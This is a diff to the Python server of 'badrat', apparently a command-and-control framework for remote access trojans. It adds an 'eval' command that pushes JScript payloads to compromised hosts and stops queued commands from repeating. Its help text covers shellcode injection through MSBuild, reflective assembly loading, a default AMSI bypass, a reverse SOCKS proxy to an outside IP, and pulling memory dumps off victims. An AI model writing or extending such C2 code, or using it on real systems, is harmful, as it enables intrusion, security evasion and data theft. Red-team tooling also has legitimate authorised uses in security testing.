@@ -52,7 +52,7 @@ usernames = {}
 # Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
 class Completer(object):
     def __init__(self):
-        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode"]
+        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval"]
         self.re_space = re.compile('.*\s+$', re.M)
 
     def add_tab_item(self, item):
@@ -112,6 +112,9 @@ class Completer(object):
         return self._complete_path(args[0])
 
     def complete_shellcode(self, args):
+        return self._complete_path(args[0])
+
+    def complete_eval(self, args):
         return self._complete_path(args[0])
 
     def complete_remove(self, args):
@@ -460,7 +463,10 @@ def serve_server(port=8080):
                 fd.write(base64.b64decode(post_dict['dl']))
             pretty_print("\n[*] File download from rat " + colors(ratID) + " saved to " + colors("downloads/" + colors(ratID)) + colors("." + rand))
 
-        return(htmlify(json.dumps({"cmnd": commands[ratID]})))
+        # Reset the command on deck to blank after sending the command (so we don't get repeated executions of the same command)
+        cmnd = commands[ratID]
+        commands[ratID] = ""
+        return(htmlify(json.dumps({"cmnd": cmnd})))
 
     if(verbose):
         pretty_print("[v] Starting badrat in verbose mode. Prepare to have your screen flooded.")
@@ -551,12 +557,14 @@ def get_help():
     pretty_print("psh <local_powershell_script_path> <extra powershell commands> -- Runs the powershell script on the rat. Uses MSBuild.exe or powershell.exe depending on the agent type")
     pretty_print("example: psh script/Invoke-SocksProxy.ps1 Invoke-ReverseSocksProxy -remotePort 4444 -remoteHost 12.23.34.45")
     pretty_print("csharp <local_c_sharp_exe_path> <command_arguments> -- Runs the assembly on the remote host using MSBuild.exe and a C Sharp reflective loader stub")
-    pretty_print("example: cs scripts/Snaffler.exe --domain borgar.local --stdout")
+    pretty_print("example: csharp scripts/Snaffler.exe --domain borgar.local --stdout")
     pretty_print("shellcode <local_shellcode.bin_path> -- Runs the specified shellcode in a new process using MSBuild.exe and a C Sharp injection stub")
     pretty_print("upload -- Uploads file from C2 server to rat host")
     pretty_print("example: upload scripts/Invoke-Bloodhound.ps1 C:\\users\\localadmin\\desktop\\ibh.ps1")
     pretty_print("download -- downloads the specified file from the rat host")
     pretty_print("example: download C:\\users\\localadmin\\desktop\\minidump_660.dmp")
+    pretty_print("eval <local_jscript_file> -- sends the jscript file to the rat (JS and HTA only) to be evaulated in line. Useful for Gadget2JS payloads")
+    pretty_print("example: eval test.js")
     pretty_print("-------------------------------------------------------------------------")
     pretty_print("")
     pretty_print("Extra things to know:")
@@ -567,7 +575,7 @@ def get_help():
     pretty_print("By default, rat communications are NOT SECURE. Do not send sensitive info through the C2 channel unless using SSL")
     pretty_print("Rats are designed to use methods native to their type as much as possible. E.g.: HTA rat will never use Powershell.exe, and the Powershell rat will never use cmd.exe")
     pretty_print("Tal Liberman's AMSI Bypass is included by default for msbuild psh execution (js and hta ONLY). This may not be desireable and can be turned off by changing the variable at the beginning of this script")
-    pretty_print("All assemblies run with \"cs\" must be compiled with a public Main method and a public class that contains Main\n")
+    pretty_print("All assemblies run with \"csharp\" must be compiled with a public Main method and a public class that contains Main\n")
 
 if __name__ == "__main__":
     # Start the Flask server
@@ -687,6 +695,18 @@ if __name__ == "__main__":
                                     inp = "shc " + encode_file(filepath)
                                 else:
                                     inp = "shc " + msbuild_path + " " + send_shellcode_msbuild_xml(inp, ratID)
+                            except:
+                                pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
+                                continue
+
+                        elif(str.startswith(inp, "eval ")):
+                            try:
+                                filepath = inp.split(" ")[1]
+                                if(types[ratID] == "ps1" or types[ratID] == "c#"):
+                                    pretty_print("[!] Eval is not supported for PS1 or C# rats")
+                                    continue
+                                else:
+                                    inp = "ev " + encode_file(filepath)
                             except:
                                 pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                                 continue
